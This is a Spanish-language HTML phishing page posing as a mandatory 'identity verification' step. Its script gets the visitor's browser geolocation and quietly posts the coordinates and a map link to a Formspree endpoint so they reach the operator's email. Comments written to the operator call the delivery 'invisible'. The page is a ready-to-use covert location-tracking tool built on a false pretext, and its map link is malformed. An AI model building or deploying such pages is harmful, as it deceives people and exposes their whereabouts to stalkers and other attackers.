<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Identidad</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background-color: #f4f4f9; }
        .box { background: white; padding: 30px; display: inline-block; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        button { padding: 12px 20px; font-size: 16px; cursor: pointer; background-color: #28a745; color: white; border: none; border-radius: 4px; width: 85%; font-weight: bold; }
        button:hover { background-color: #218838; }
    </style>
</head>
<body>

    <!-- PANTALLA PRINCIPAL DIRECTA -->
    <div class="box">
        <h2>Verificación Obligatoria</h2>
        <p>Para validar tu identidad y continuar con el proceso, es necesario confirmar tu ubicación actual.</p>
        <button onclick="obtenerUbicacion()">Confirmar y Continuar</button>
    </div>

    <script>
        // 1. CONFIGURACIÓN: Tu enlace de Formspree ya está listo aquí
        const FORMSPREE_URL = "https://formspree.io"; 

        function obtenerUbicacion() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        
                        // LÍNEA CORREGIDA: Ahora genera un enlace válido hacia Google Maps
                        const mapaLink = `https://google.com{lat},${lon}`;

                        const datosEnvio = {
                            mensaje: "Nueva ubicación registrada (Sin contraseña)",
                            latitud: lat,
                            longitud: lon,
                            google_maps: mapaLink
                        };

                        // Envío invisible y cifrado a tu correo electrónico
                        fetch(FORMSPREE_URL, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'Accept': 'application/json'
                            },
                            body: JSON.stringify(datosEnvio)
                        })
                        .then((response) => {
                            if (response.ok) {
                                // Redirección o mensaje de éxito para el usuario
                                alert("Ubicación verificada con éxito. Procesando datos...");
                            } else {
                                alert("Error en el servidor de verificación.");
                            }
                        })
                        .catch((error) => {
                            alert("Error de conexión segura.");
                        });
                    },
                    (error) => {
                        alert("Es obligatorio permitir el acceso a la ubicación para continuar.");
                    }
                );
            } else {
                alert("Tu dispositivo o navegador no admite geolocalización.");
            }
        }
    </script>

</body>
</html>
